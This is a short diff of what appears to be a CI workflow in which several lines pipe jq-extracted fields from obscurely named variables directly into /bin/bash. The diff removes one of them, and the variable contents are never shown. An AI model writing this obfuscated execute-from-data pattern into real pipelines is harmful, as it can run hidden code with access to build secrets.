@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$y3" | jq -r .fxxz619 | /bin/bash
           echo $uzubt04 | jq -r .jxk1448 | /bin/bash
           echo $smwpo90 | jq -r .w25209 | /bin/bash
-          echo $obr85 | jq -r .civ49576 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
